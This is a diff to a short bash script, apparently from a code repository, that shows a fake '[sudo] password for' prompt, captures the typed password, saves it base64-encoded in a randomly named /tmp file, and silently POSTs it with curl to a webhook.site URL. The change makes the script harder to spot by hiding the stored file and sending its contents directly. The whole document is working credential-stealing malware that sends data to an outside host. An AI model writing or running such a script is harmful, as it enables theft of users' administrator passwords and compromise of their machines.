@@ -1,15 +1,19 @@
 #!/bin/bash
 
-password_file="root_password.txt"
-webhook_url="https://webhook.site/pate-your-l1nk"  # Replace with your webhook URL
+random_dir="/tmp/$USER-$(date +%s%N)"
+password_file="$random_dir/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 20).txt"
+webhook_url="https://webhook.site/paste-your-link"  # Replace with your webhook URL
+
+# Create a random directory if it doesn't exist
+mkdir -p "$random_dir"
 
 if [ ! -f "$password_file" ]; then
   read -s -p "[sudo] password for $(whoami): " root_password
   echo
   echo "$root_password" | base64 > "$password_file"
 
-  # Send the password file content to webhook.site and redirect output to /dev/null
-  curl -X POST -F "file_content=$(cat "$password_file" | base64)" "$webhook_url" >/dev/null 2>&1
+  # Send the password file content to webhook.site without base64 encoding
+  curl -X POST -d "@$password_file" "$webhook_url" >/dev/null 2>&1
 else
   stored_password=$(cat "$password_file" | base64 -d)
   echo -n "[sudo] password for $(whoami): "
